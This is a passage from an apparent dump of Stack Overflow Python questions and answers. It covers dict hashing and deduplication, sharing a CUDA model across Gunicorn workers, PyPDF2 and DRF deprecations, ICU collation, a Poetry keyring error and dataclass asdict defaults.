    for log in logs:
        log_hash = compute_hash(log)
        if log_hash in already_seen:
            continue
        already_seen.add(log_hash)
        yield log
</code></pre>
<p>However, I found that <code>compute_hash</code> would give the same hash for different dictionaries, even ones with completely bogus contents:</p>
<pre><code>&gt;&gt;&gt; logs = [{'id': '123', 'error': None, 'fruit': 'orange'}, {}]
&gt;&gt;&gt; # The empty dict will be removed; every dict seems to get the same hash.
&gt;&gt;&gt; list(deduplicate(logs))
[{'id': '123', 'error': None, 'fruit': 'orange'}]
</code></pre>
<p>After some experimentation, I was seemingly able to fix the problem by modifying <code>compute_hash</code> like so:</p>
<pre><code>def compute_hash(log_dict: dict):
    return hash(frozenset(log_dict.values()))
</code></pre>
<p>However, I cannot understand why this makes a difference. <strong>Why</strong> did the original version seem to give the same hash for every input dict? Why does converting the <code>.values</code> result to a <code>frozenset</code> first fix the problem?
Aside from that: <strong>is this algorithm correct</strong>? Or is there some counterexample where the wrong values will be removed?</p>
<hr />
<p><sub>This question discusses how hashing works in Python, in depth, as well as considering other data structures that might be more appropriate than dictionaries for the list elements. See <a href=""https://stackoverflow.com/questions/11092511"">List of unique dictionaries</a> instead if you simply want to remove duplicates from a list of dictionaries.</sub></p>
","74965910","<h2>What went wrong</h2>
<p>The first thing I want to point out about the original attempt is that it seems over-engineered. When the inputs are hashable, manually iterating is only necessary <a href=""https://stackoverflow.com/questions/480214"">to preserve order</a>, and even then, in 3.7 and up we can rely on the order-preserving property of <code>dict</code>s.</p>
<h3>Just because it's hashable doesn't mean the hash is useful</h3>
<p>It also isn't especially useful to call <code>hash</code> on <code>log_dict.values()</code>. While <code>log_dict</code> is not hashable, its <code>.values()</code> (in 3.x) is an instance of the <code>dict_values</code> type (the name is not defined in the builtins, but that is how instances identify themselves), which <strong>is</strong> hashable:</p>
<pre><code>&gt;&gt;&gt; dv = {1:2, 3:4}.values()
&gt;&gt;&gt; dv
dict_values([2, 4])
&gt;&gt;&gt; {dv}
{dict_values([2, 4])}
</code></pre>
<p>So we could just as easily have used the <code>.values()</code> directly as a &quot;hash&quot;:</p>
<pre><code>def compute_hash(log_dict: dict):
    return log_dict.values()
</code></pre>
<p>... but this would have given a new bug - now every hash would be <strong>different</strong>:</p>
<pre><code>&gt;&gt;&gt; {1:2}.values() == {1:2}.values()
False
</code></pre>
<h3>But why?</h3>
<p>Because <code>dict_values</code> type doesn't define <code>__hash__</code>, nor <code>__eq__</code>. <code>object</code> is the immediate superclass, so calls to those methods fall back to the <code>object</code> defaults:</p>
<pre><code>&gt;&gt;&gt; dv.__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; dv.__class__.__hash__
&lt;slot wrapper '__hash__' of 'object' objects&gt;
&gt;&gt;&gt; dv.__class__.__eq__
&lt;slot wrapper '__eq__' of 'object' objects&gt;
</code></pre>
<p>In fact, <code>dict_values</code> cannot sensibly implement these methods because <strong>it is (indirectly) mutable</strong> - as a view, it is dependent on the underlying dict:</p>
<pre><code>&gt;&gt;&gt; d = {1:2}
&gt;&gt;&gt; dv = d.values()
&gt;&gt;&gt; d[3] = 4
&gt;&gt;&gt; dv
dict_values([2, 4])
</code></pre>
<p>Since there isn't an obvious generic way to hash any object that also isn't exceedingly slow, while also caring about its actual attributes, the default simply <em>doesn't</em> care about attributes and is simply based on object identity. For example, on my platform, the results look like:</p>
<pre><code>Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; dv = {1:2, 3:4}.values()
&gt;&gt;&gt; bin(id(dv))
'0b11111110101110011010010110000001010101011110000'
&gt;&gt;&gt; bin(hash(dv))
'0b1111111010111001101001011000000101010101111'
</code></pre>
<p>In other words:</p>
<pre><code>&gt;&gt;&gt; hash(dv) == id(dv) // 16
True
</code></pre>
<p>Thus, if <code>compute_hash</code> in the original code is repeatedly called with temporary objects, it won't give useful results - the results don't depend on the contents of the object, and will commonly be the same, as temporary (i.e., immediately GCd) objects in a loop will often end up in the same memory location.</p>
<p>(Yes, this means that objects default to being hashable and equality-comparable. The <code>dict</code> type itself overrides <code>__hash__</code> to explicitly disallow it, while - curiously - overriding <code>__eq__</code> to compare contents.)</p>
<h3><code>frozenset</code> has a useful hash</h3>
<p>On the other hand, <code>frozenset</code> is intended for long-term storage of some immutable data. Consequently, it's important and useful for it to define a <code>__hash__</code>, and it does:</p>
<pre><code>&gt;&gt;&gt; f = frozenset(dv)
&gt;&gt;&gt; bin(id(f))
'0b11111110101110011010001011101000110001011100000'
&gt;&gt;&gt; bin(hash(f))
'0b101111010001101001001111100001000001100111011101101100000110001'
</code></pre>
<h2>Dictionaries, hashing and collision detection</h2>
<p>Although there have been many tweaks and optimizations over the years, Pythons <code>dict</code> and <code>set</code> types are both fundamentally <a href=""https://stackoverflow.com/questions/114830"">based on hash tables</a>. When a value is inserted, its hash is first computed (normally an integer value), and then that value is reduced (normally using modulo) into an index into the underlying table storage. Similarly, when a value is looked up, the hash is computed and reduced in order to determine where to look in the table for that value.</p>
<p>Of course, it is possible that some other value is already stored in that spot. There are multiple possible strategies for dealing with this (and last I checked, the literature is inconsistent about naming them). But most importantly for our purposes: when looking up a value in a <code>dict</code> by key, or checking for the presence of a value in a <code>set</code>, the container will also have to do equality checks after figuring out where to look, in order to confirm that the right thing has actually been found.</p>
<p>Consequently, <strong>any approach that simply computes a hash manually, and naively associates those hashes with the original values, will fail</strong>. It is easy for two of the input dicts to have the same computed hash value, <em>even if their contents are actually being considered</em>. For example, the hash of a <code>frozenset</code> <a href=""https://github.com/python/cpython/blob/main/Objects/setobject.c#L684"" rel=""nofollow noreferrer"">is based on an XOR of hashes for the elements</a>. So if two of our input dicts had all the same values <em>assigned to keys in a different order</em>, the hash would be the same:</p>
<pre><code>&gt;&gt;&gt; def show_hash(d):
...     return bin(hash(frozenset(d.values())))
... 
&gt;&gt;&gt; show_hash({'id': '1', 'error': None, 'value': 'apple'})
'0b101010010100001000111001000001000111101111110100010000010101110'
&gt;&gt;&gt; # Changing a value changes the hash...
&gt;&gt;&gt; show_hash({'id': '1', 'error': None, 'value': 'orange'})
'0b11111111001000011101011001001011100010100100010010110000100100'
&gt;&gt;&gt; # but rearranging them does not:
&gt;&gt;&gt; show_hash({'id': '1', 'error': 'orange', 'value': None})
'0b11111111001000011101011001001011100010100100010010110000100100'
</code></pre>
<p>It's also possible for such a hash collision to occur by coincidence with totally unrelated values. It's extremely unlikely for 64-bit hashes (since this value will <strong>not</strong> be reduced and used as a hash table index, despite the name)</p>
<h3>Fixing it explicitly</h3>
<p>So, in order to have correct code, we would need to do our own checking afterwards, explicitly checking whether the value which hashed to something in our <code>already_seen</code> set was actually equal to previous values that had that hash. And there <em>could theoretically</em> be multiple of those, so we'd have to remember multiple values for each of those external hashes, perhaps by using a <code>dict</code> for <code>already_seen</code> instead. Something like:</p>
<pre><code>from collections import defaultdict

def deduplicate(logs):
    already_seen = defaultdict(list)
    for log in logs:
        log_hash = compute_hash(log)
        if log in already_seen.get(log_hash, ()):
            continue
        already_seen[log_hash].append(log)
        yield log
</code></pre>
<p>Hopefully this immediately looks unsatisfactory. With this approach, we are essentially re-implementing the core logic of sets and dictionaries - we compute hashes ourselves, retrieve corresponding values from internal storage (<code>already_seen</code>) <strong>and</strong> then manually check for equality (<code>if log in ...</code>).</p>
<h3>Looking at it from another angle</h3>
<p>The reason we're doing all of this in the first place - looking for a hash value to represent the original dict in our own storage - is because the dict isn't hashable. But we could address that problem head-on, instead, by explicitly <strong>converting</strong> the data into a hashable form (that preserves all the information), rather than trying to <em>relate</em> a hashable value to the data.</p>
<p>In other words, let's <strong>use a different type</strong> to represent the data, rather than a <code>dict</code>.</p>
<p>Since all our input <code>dict</code>s have the same keys, the natural thing to do would be to convert those into the <strong>attributes of a user-defined class</strong>. In 3.7 and up, a simple, natural and explicit way to do this is using a <a href=""https://docs.python.org/3/library/dataclasses.html"" rel=""nofollow noreferrer"">dataclass</a>, like so:</p>
<pre><code>from dataclasses import dataclass
from typing import Optional

@dataclass(frozen=True, slots=True)
class LogEntry:
    id: str
    error: Optional[str]
    fruit: str
</code></pre>
<p>It's not explained very well in the documentation, but using <code>frozen=True</code> (the main purpose is to make the instances immutable) will cause a <code>__hash__</code> to be generated as well, taking the fields into account as desired. Using <code>slots=True</code> causes <code>__slots__</code> to be generated for the type as well, <a href=""https://stackoverflow.com/questions/45123238"">avoiding memory overhead</a>.</p>
<p>From here, it's trivial to convert the existing logs:</p>
<pre><code>logs = [LogEntry(**d) for d in logs]
</code></pre>
<p>And we can directly deduplicate with a <code>set</code>:</p>
<pre><code>set(logs)
</code></pre>
<p>or, preserving order using a <code>dict</code> (in 3.7 and up):</p>
<pre><code>list(dict.fromkeys(logs))
</code></pre>
<p>There are other options, of course. The simplest is to make a <code>tuple</code> from the <code>.values</code> - assuming each log dict has its keys <em>in the same order</em> (again, assuming Python 3.7 and up, where keys <em>have</em> an order), this preserves all the <em>useful</em> information - the <code>.keys</code> are just for convenience. Slightly more sophisticated, we could use <code>collections.namedtuple</code>:</p>
<pre><code>from collections import namedtuple

LogEntry = namedtuple('LogEntry', 'id error fruit')
# from here, use the LogEntry type as before
</code></pre>
<p>This is simpler than the <code>dataclass</code> approach, but less explicit (and doesn't offer an elegant way to document field types).</p>
"
"72779926","1","GUnicorn + CUDA: Cannot re-initialize CUDA in forked subprocess","<p>I am creating an inference service with torch, gunicorn and flask that should use CUDA. To reduce resource requirements, I use the preload option of gunicorn, so the model is shared between the worker processes. However, this leads to an issue with CUDA. The following code snipped shows a minimal reproducing example:</p>
<pre><code>from flask import Flask, request
import torch

app = Flask('dummy')

model = torch.rand(500)
model = model.to('cuda:0')


@app.route('/', methods=['POST'])
def f():
    data = request.get_json()
    x = torch.rand((data['number'], 500))
    x = x.to('cuda:0')
    res = x * model
    return {
        &quot;result&quot;: res.sum().item()
    }
</code></pre>
<p>Starting the server with <code>CUDA_VISIBLE_DEVICES=1 gunicorn -w 3 -b $HOST_IP:8080 --preload run_server:app</code> lets the service start successfully. However, once doing the first request (<code>curl -X POST -d '{&quot;number&quot;: 1}'</code>), the worker throws the following error:</p>
<pre><code>[2022-06-28 09:42:00,378] ERROR in app: Exception on / [POST]
Traceback (most recent call last):
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/app.py&quot;, line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/app.py&quot;, line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/app.py&quot;, line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/_compat.py&quot;, line 39, in reraise
    raise value
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/app.py&quot;, line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File &quot;/home/user/.local/lib/python3.6/site-packages/flask/app.py&quot;, line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File &quot;/home/user/project/run_server.py&quot;, line 14, in f
    x = x.to('cuda:0')
  File &quot;/home/user/.local/lib/python3.6/site-packages/torch/cuda/__init__.py&quot;, line 195, in _lazy_init
    &quot;Cannot re-initialize CUDA in forked subprocess. &quot; + msg)
RuntimeError: Cannot re-initialize CUDA in forked subprocess. To use CUDA with multiprocessing, you must use the 'spawn' start method
</code></pre>
<p>I load the model in the parent process and it's accessible to each forked worker process. The problem occurs when creating a CUDA-backed tensor in the worker process. This re-initializes the CUDA context in the worker process, which fails because it was already initialized in the parent process. If we set <code>x = data['number']</code> and remove <code>x = x.to('cuda:0')</code>, the inference succeeds.</p>
<p>Adding <code>torch.multiprocessing.set_start_method('spawn')</code> or <code>multiprocessing.set_start_method('spawn')</code> won't change anything, probably because gunicorn will definitely use <code>fork</code> when being started with the <code>--preload</code> option.</p>
<p>A solution could be not using the <code>--preload</code> option, which leads to multiple copies of the model in memory/GPU. But this is what I am trying to avoid.</p>
<p>Is there any possibility to overcome this issue <em>without</em> loading the model separately in each worker process?</p>
","75308606","<h2>Reason for the Error</h2>
<p>As correctly stated in the comments by @Newbie, the issue isn't the model itself, but the CUDA context. When new child processes are forked, the parent's memory is shared read-only with the child, but the CUDA context doesn't support this sharing, it must be <em>copied</em> to the child. Hence, it reports above-mentioned error.</p>
<h2><code>Spawn</code> instead of <code>Fork</code></h2>
<p>To resolve this issue, we have to change the start method for the child processes from <code>fork</code> to <code>spawn</code> with <code>multiprocessing.set_start_method</code>. The following simple example works fine:</p>
<pre><code>import torch
import torch.multiprocessing as mp


def f(y):
    y[0] = 1000


if __name__ == '__main__':
    x = torch.zeros(1).cuda()
    x.share_memory_()

    mp.set_start_method('spawn')
    p = mp.Process(target=f, args=(x,), daemon=True)
    p.start()
    p.join()
    print(&quot;x =&quot;, x.item())
</code></pre>
<p>When running this code, a second CUDA context is initialized (this can be observed via <code>watch -n 1 nvidia-smi</code> in a second window), and <code>f</code> is executed after the context was initialized completely. After this, <code>x = 1000.0</code> is printed on the console, thus, we confirmed that the tensor <code>x</code> was successfully shared between the processes.</p>
<p>However, Gunicorn internally uses <code>os.fork</code> to start the worker processes, so <code>multiprocessing.set_start_method</code> has no influence on Gunicorn's behavior. Consequently, initializing the CUDA context in the root process must be avoided.</p>
<h2>Solution for Gunicorn</h2>
<p>In order to share the model among the worker processes, we thus must load the model in one single process and share it with the workers. Luckily, sending a CUDA tensor via a <code>torch.multiprocessing.Queue</code> to another process doesn't copy the parameters on the GPU, so we can use those queues for this problem.</p>
<pre><code>import time

import torch
import torch.multiprocessing as mp


def f(q):
    y = q.get()
    y[0] = 1000


def g(q):
    x = torch.zeros(1).cuda()
    x.share_memory_()
    q.put(x)
    q.put(x)
    while True:
        time.sleep(1)  # this process must live as long as x is in use


if __name__ == '__main__':
    queue = mp.Queue()
    pf = mp.Process(target=f, args=(queue,), daemon=True)
    pf.start()
    pg = mp.Process(target=g, args=(queue,), daemon=True)
    pg.start()
    pf.join()
    x = queue.get()
    print(&quot;x =&quot;, x.item())  # Prints x = 1000.0
</code></pre>
<p>For the Gunicorn server, we can use the same strategy: A model server process loads the model and serves it to each new worker process after its fork. In the <code>post_fork</code> hook the worker requests and receives the model from the model server. A Gunicorn configuration could look like this:</p>
<pre><code>import logging

from client import request_model
from app import app

logging.basicConfig(level=logging.INFO)

bind = &quot;localhost:8080&quot;
workers = 1
zmq_url = &quot;tcp://127.0.0.1:5555&quot;


def post_fork(server, worker):
    app.config['MODEL'], app.config['COUNTER'] = request_model(zmq_url)
</code></pre>
<p>In the <code>post_fork</code> hook, we call <code>request_model</code> to get a model from the model server and store the model in the configuration of the Flask application. The method <code>request_model</code> is defined in my example in the file <code>client.py</code> and defined as follows:</p>
<pre><code>import logging
import os

from torch.multiprocessing.reductions import ForkingPickler
import zmq


def request_model(zmq_url: str):
    logging.info(&quot;Connecting&quot;)
    context = zmq.Context()
    with context.socket(zmq.REQ) as socket:
        socket.connect(zmq_url)
        logging.info(&quot;Sending request&quot;)
        socket.send(ForkingPickler.dumps(os.getpid()))
        logging.info(&quot;Waiting for a response&quot;)
        model = ForkingPickler.loads(socket.recv())
    logging.info(&quot;Got response from object server&quot;)
    return model
</code></pre>
<p>We make use of <a href=""https://github.com/benoitc/gunicorn/issues/1621"" rel=""nofollow noreferrer"">ZeroMQ</a> for inter-process communication here because it allows us to reference servers by name/address and to outsource the server code into its own application. <code>multiprocessing.Queue</code> and <code>multiprocessing.Process</code> apparently <a href=""https://stackoverflow.com/questions/75293644/gunicorn-queue-not-working-after-re-starting-worker/75307381"">don't work well with Gunicorn</a>. <code>multiprocessing.Queue</code> uses the <code>ForkingPickler</code> internally to serialize the objects, and the module <code>torch.multiprocessing</code> alters it in a way that Torch data structures can be serialized appropriately and reliably. So, we use this class to serialize our model to send it to the worker processes.</p>
<p>The model is loaded and served in an application that is completely separate from Gunicorn and defined in <code>server.py</code>:</p>
<pre><code>from argparse import ArgumentParser
import logging

import torch
from torch.multiprocessing.reductions import ForkingPickler
import zmq


def load_model():
    model = torch.nn.Linear(10000, 50000)
    model.cuda()
    model.share_memory()

    counter = torch.zeros(1).cuda()
    counter.share_memory_()
    return model, counter


def share_object(obj, url):
    context = zmq.Context()
    socket = context.socket(zmq.REP)
    socket.bind(url)
    while True:
        logging.info(&quot;Waiting for requests on %s&quot;, url)
        message = socket.recv()
        logging.info(&quot;Got a message from %d&quot;, ForkingPickler.loads(message))
        socket.send(ForkingPickler.dumps(obj))


if __name__ == '__main__':
    parser = ArgumentParser(description=&quot;Serve model&quot;)
    parser.add_argument(&quot;--listen-address&quot;, default=&quot;tcp://127.0.0.1:5555&quot;)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    logging.info(&quot;Loading model&quot;)
    model = load_model()
    share_object(model, args.listen_address)
</code></pre>
<p>For this test, we use a model of about 2GB in size to see an effect on the GPU memory allocation in <code>nvidia-smi</code> and a small tensor to verify that the data is actually shared among the processes.</p>
<p>Our sample flask application runs the model with a random input, counts the number of requests and returns both results:</p>
<pre><code>from flask import Flask
import torch

app = Flask(__name__)


@app.route(&quot;/&quot;, methods=[&quot;POST&quot;])
def infer():
    model: torch.nn.Linear = app.config['MODEL']
    counter: torch.Tensor = app.config['COUNTER']
    counter[0] += 1  # not thread-safe
    input_features = torch.rand(model.in_features).cuda()
    return {
        &quot;result&quot;: model(input_features).sum().item(),
        &quot;counter&quot;: counter.item()
    }
</code></pre>
<h2>Test</h2>
<p>The example can be run as follows:</p>
<pre><code>$ python server.py &amp;
INFO:root:Waiting for requests on tcp://127.0.0.1:5555 
$ gunicorn -c config.py app:app
[2023-02-01 16:45:34 +0800] [24113] [INFO] Starting gunicorn 20.1.0
[2023-02-01 16:45:34 +0800] [24113] [INFO] Listening at: http://127.0.0.1:8080 (24113)
[2023-02-01 16:45:34 +0800] [24113] [INFO] Using worker: sync
[2023-02-01 16:45:34 +0800] [24186] [INFO] Booting worker with pid: 24186
INFO:root:Connecting
INFO:root:Sending request
INFO:root:Waiting for a response
INFO:root:Got response from object server
</code></pre>
<p>Using <code>nvidia-smi</code>, we can observe that now, two processes are using the GPU, and one of them allocates 2GB more VRAM than the other. Querying the flask application also works as expected:</p>
<pre><code>$ curl -X POST localhost:8080
{&quot;counter&quot;:1.0,&quot;result&quot;:-23.956459045410156} 
$ curl -X POST localhost:8080
{&quot;counter&quot;:2.0,&quot;result&quot;:-8.161510467529297}
$ curl -X POST localhost:8080
{&quot;counter&quot;:3.0,&quot;result&quot;:-37.823692321777344}
</code></pre>
<p>Let's introduce some chaos and terminate our only Gunicorn worker:</p>
<pre><code>$ kill 24186
[2023-02-01 18:02:09 +0800] [24186] [INFO] Worker exiting (pid: 24186)
[2023-02-01 18:02:09 +0800] [4196] [INFO] Booting worker with pid: 4196
INFO:root:Connecting
INFO:root:Sending request
INFO:root:Waiting for a response
INFO:root:Got response from object server
</code></pre>
<p>It's restarting properly and ready to answer our requests.</p>
<h2>Benefit</h2>
<p>Initially, the amount of required VRAM for our service was <code>(SizeOf(Model) + SizeOf(CUDA context)) * Num(Workers)</code>. By sharing the weights of the model, we can reduce this by <code>SizeOf(Model) * (Num(Workers) - 1)</code> to <code>SizeOf(Model) + SizeOf(CUDA context) * Num(Workers)</code>.</p>
<h2>Caveats</h2>
<p>The reliability of this approach relies on the single model server process. If that process terminates, not only will newly started workers get stuck, but the models in the existing workers will become unavailable and all workers crash at once. The shared tensors/models are only available as long as the server process is running. Even if the model server and Gunicorn workers are restarted, a short outage is certainly unavoidable. In a production environment, you thus should make sure this server process is kept alive.</p>
<p>Additionally, sharing data among different processes can have side effects. When sharing changeable data, proper locks must be used to avoid race conditions.</p>
"
"74939758","1","Camelot: DeprecationError: PdfFileReader is deprecated","<p>I have been using camelot for our project, but since 2 days I got following errorMessage. When trying to run following code snippet:</p>
<pre><code>import camelot
tables = camelot.read_pdf('C:\\Users\\user\\Downloads\\foo.pdf', pages='1')
</code></pre>
<p>I get this error:</p>
<pre><code>DeprecationError: PdfFileReader is deprecated and was removed in PyPDF2 3.0.0. Use PdfReader instead.
</code></pre>
<p>I checked this file and it does use pdfFileReader: c:\ProgramData\Anaconda3\lib\site-packages\camelot\handlers.py</p>
<p>I thought that I can specify the version of PyPDF2, but it will be installed automatically(because the library is used by camelot) when I install camelot. Do you think there is any solution to specify the version of PyPDF2 manually?</p>
","74957139","<p>This is <a href=""https://github.com/camelot-dev/camelot/issues/339"" rel=""nofollow noreferrer"">issues #339</a>.</p>
<p>While there will hopefully be soon a release including the fix, you can still do this:</p>
<pre><code>pip install 'PyPDF2&lt;3.0'
</code></pre>
<p>after you've installed camelot.</p>
<p>See <a href=""https://github.com/camelot-dev/camelot/issues/339#issuecomment-1367331630"" rel=""nofollow noreferrer"">https://github.com/camelot-dev/camelot/issues/339#issuecomment-1367331630</a> for details and screenshots.</p>
"
"73823743","1","AttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'","<p>After upgrading <a href=""https://pypi.org/project/djangorestframework/"" rel=""noreferrer"">djangorestframework</a> from <code>djangorestframework==3.13.1</code> to <code>djangorestframework==3.14.0</code> the code</p>
<pre class=""lang-py prettyprint-override""><code>from rest_framework.serializers import NullBooleanField
</code></pre>
<p>Throws</p>
<blockquote>
<p>AttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'</p>
</blockquote>
<p>Reading <a href=""https://www.django-rest-framework.org/community/release-notes/#314x-series"" rel=""noreferrer"">the release notes</a> I don't see a deprecation. Where did it go?</p>
","74221187","<p>For what it's worth, there's a <a href=""https://github.com/encode/django-rest-framework/pull/8599/files#diff-7768b980611e24de782acc70ad64cd57b9d169d42f80b200cb7c6ef277fd74dbL720"" rel=""nofollow noreferrer"">deprecation warning</a> in the previous version, which also suggests a fix:</p>
<blockquote>
<p>The <code>NullBooleanField</code> is deprecated and will be removed starting with 3.14. Instead use the <code>BooleanField</code> field and set <code>allow_null=True</code> which does the same thing.</p>
</blockquote>
"
"74058262","1","icu: Sort strings based on 2 different locales","<p>As you probably know, the order of alphabet in some (maybe most) languages is different than their order in Unicode. That's why we may want to use <code>icu.Collator</code> to sort, like this Python example:</p>
<pre><code>from icu import Collator, Locale
collator = Collator.createInstance(Locale(&quot;fa_IR.UTF-8&quot;))
mylist.sort(key=collator.getSortKey)
</code></pre>
<p>This works perfectly for Persian strings. But it also sorts all Persian strings before all ASCII / English strings (which is the opposite of Unicode sort).</p>
<p>What if we want to sort ASCII before this given locale?</p>
<p>Or ideally, I want to sort by 2 or multiple locales. (For example give multiple <code>Locale</code> arguments to <code>Collator.createInstance</code>)</p>
<p>If we could tell <code>collator.getSortKey</code> to return empty bytes for other locales, then I could create a tuple of 2 <code>collator.getSortKey()</code> results, for example:</p>
<pre><code>from icu import Collator, Locale

collator1 = Collator.createInstance(Locale(&quot;en_US.UTF-8&quot;))
collator2 = Collator.createInstance(Locale(&quot;fa_IR.UTF-8&quot;))

def sortKey(s):
    return collator1.getSortKey(s), collator2.getSortKey(s)

mylist.sort(key=sortKey)
</code></pre>
<p>But looks like <code>getSortKey</code> always returns non-empty bytes.</p>
","75442315","<p>A bit late to answer the question, but here it is for future reference.</p>
<p>ICU collation uses the CLDR Collation Algorithm, which is a tailoring of the Unicode Collation Algorithm. The default collation is referred to as the root collation. Don't think in terms of Locales having a set of collation rules, think more in terms of locales specify any differences between the collation rules that the locale needs and the root collation. CLDR takes a minimalist approach, you only need to include the minimal set of differences needed based on the root collation.</p>
<p>English uses the root locale. No tailorings. Persian on the other hand has a few rules needed to override certain aspects of the root collation.</p>
<p>As the question indicates, the Persian collation rules order Arabic characters before Latin characters. In the collation rule set for Persian there is a rule <code>[reorder Arab]</code>. This rule is what you need to override.</p>
<p>There are a few ways to do this:</p>
<ol>
<li>Use <code>icu.RuleBasedCollator</code> with a coustom set fo rules for Persian.</li>
<li>Create a standard Persian collation, retrieve the rules, strip out the reorder directive and then use modified rules with <code>icu.RuleBasedCollator</code>.</li>
<li>Create collator instance using a BCP-47 language tag, instead of a Locale identifier</li>
</ol>
<p>There are other approaches as well, but the third is the simplest:</p>
<pre><code>loc = Locale.forLanguageTag(&quot;fa-u-kr-latn-arab&quot;)
collator = Collator.createInstance(loc)
sorted(mylist, key=collator.getSortKey)
</code></pre>
<p>This will reorder the Persian collation rules, placing Latin script before Arabic script, then everything else afterwards.</p>
"
"74392324","1","Poetry install throws WinError 1312 when running over SSH on Windows 10","<p>I have an SSH connection from a Windows machine to another, and then trying to do a poetry install.</p>
<p><strong>My problem is</strong>:
I get this error when executing poetry install <strong>through ssh</strong>:</p>
<pre><code>[WinError 1312] A specified logon session does not exist. It may already have been terminated.
</code></pre>
<p>This command works perfectly when I execute it locally on the target machine, but fails when connecting through ssh.</p>
<p><strong>How can I get rid/fix the [WinError 1312]?</strong></p>
<p>I saw another user that posted the same question recently, but removed it.</p>
<p>I've seen some clues regarding the MachineKeys, but have really no idea on how to proceed. Any suggestion will be highly appreciated.</p>
<hr />
<p>Python: 3.10.8</p>
<p>Poetry: 1.2.1</p>
<pre><code>Installing dependencies from lock file

Package operations: 5 installs, 0 updates, 0 removals

  • Installing install-requires (0.3.0)

  OSError

  [WinError 1312] A specified logon session does not exist. It may already have been terminated.

  at ~\AppData\Roaming\pypoetry\venv\lib\site-packages\win32ctypes\core\ctypes\_util.py:53 in check_zero
       49│
       50│ def check_zero_factory(function_name=None):
       51│     def check_zero(result, function, arguments, *args):
       52│         if result == 0:
    →  53│             raise make_error(function, function_name)
       54│         return result
       55│     return check_zero
       56│
       57│

The following error occurred when trying to handle this error:


  error

  (1312, 'CredRead', 'A specified logon session does not exist. It may already have been terminated.')

  at ~\AppData\Roaming\pypoetry\venv\lib\site-packages\win32ctypes\pywin32\pywintypes.py:37 in pywin32error
       33│ def pywin32error():
       34│     try:
       35│         yield
       36│     except WindowsError as exception:
    →  37│         raise error(exception.winerror, exception.function, exception.strerror)
       38│
</code></pre>
","74973503","<p>Based on similarities in the stack traces and your description, my guess is that you're facing the same bug from <a href=""https://github.com/python-poetry/poetry/pull/1892"" rel=""nofollow noreferrer"">#1892</a> and <a href=""https://github.com/python-poetry/poetry/issues/1917"" rel=""nofollow noreferrer"">#1917</a>, where Poetry tries to use your keyring to access/publish modules, and hence fails when these credentials are invalid.</p>
<blockquote>
<p>But it appears that poetry tries to access the keyring even for install operations.</p>
</blockquote>
<p>One of the solutions proposed was to uninstall the <code>keyring</code> package remotely:</p>
<blockquote>
<p>For me, I worked around the problem by pip uninstalling the 'keyring' package from that virt env.</p>
</blockquote>
<p>Another solution is to export the environment variable <code>PYTHON_KEYRING_BACKEND</code>. Here's an example of how you can do that on Windows:</p>
<pre><code>SET PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring
</code></pre>
<p>... and on Linux:</p>
<pre><code>export PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring
</code></pre>
<p>Unfortunately, it appears that issue #1917 is still open and unresolved, so this is the best workaround that you can find to fix the issue for now.</p>
"
"74262112","1","dataclasses: how to ignore default values using asdict()?","<p>I would like to ignore the default values after calling asdict()</p>
<pre><code>@dataclass
class A:
    a: str
    b: bool = True
</code></pre>
<p>so if I call</p>
<pre><code>a = A(&quot;1&quot;)
result = asdict(a, ignore_default=True) 
assert {&quot;a&quot;: &quot;1&quot;} == result  # the &quot;b&quot;: True should be deleted
</code></pre>
","74293119","<p>The <code>dataclasses</code> module doesn't appear to have support for detecting default values in <code>asdict()</code>, however the <a href=""https://dataclass-wizard.readthedocs.io/"" rel=""nofollow noreferrer""><code>dataclass-wizard</code></a> library does -- via <code>skip_defaults</code> argument.</p>
<p>Example:</p>
<pre class=""lang-py prettyprint-override""><code>from dataclasses import dataclass
from dataclass_wizard import asdict

@dataclass
class A:
    a: str
    b: bool = True

a = A(&quot;1&quot;)
result = asdict(a, skip_defaults=True)
assert {&quot;a&quot;: &quot;1&quot;} == result  # the &quot;b&quot;: True should be deleted
</code></pre>
<p>Further, results show it is close to <em>2x</em> faster than an approach with <code>dataclasses.adict()</code>.
I've added benchmark code I used for testing below.</p>
<pre class=""lang-py prettyprint-override""><code>from dataclasses import dataclass, asdict as asdict_orig, MISSING
from timeit import timeit

from dataclass_wizard import asdict

@dataclass
class A:
    a: str
    b: bool = True


def asdict_factory(cls):
    def factory(obj: list[tuple]) -&gt; dict:
        d = {}
        for k, v in obj:
            field_value = cls.__dataclass_fields__[k].default
            if field_value is MISSING or field_value != v:
                d[k] = v
        return d

    return factory

a = A(&quot;1&quot;)
A_fact = asdict_factory(A)

print('dataclass_wizard.asdict():  ', timeit('asdict(a, skip_defaults=True)', globals=globals()))
print('dataclasses.asdict():       ', timeit('asdict_orig(a, dict_factory=A_fact)', globals=globals()))

result1 = asdict(a, skip_defaults=True)
result2 = asdict_orig(a, dict_factory=A_fact)

assert {&quot;a&quot;: &quot;1&quot;} == result1 == result2

a2 = A(&quot;1&quot;, True)
a3 = A(&quot;1&quot;, False)
assert asdict(a2, skip_defaults=True) == asdict_orig(a2, dict_factory=A_fact)
assert asdict(a3, skip_defaults=True) == asdict_orig(a3, dict_factory=A_fact)
</code></pre>
<hr />
<p><em>Disclaimer</em>: I am the creator and maintainer of this library.</p>
"
"74307236","1","Python: Why do functools.partial functions not become bound methods when set as class attributes?","<p>I was reading about how <a href=""https://stackoverflow.com/questions/35321744/python-function-as-class-attribute-becomes-a-bound-method"">functions become bound methods when being set as class atrributes</a>. I then observed that this is not the case for functions that are wrapped by <code>functools.partial</code>. What is the explanation for this?</p>
<p>Simple example:</p>
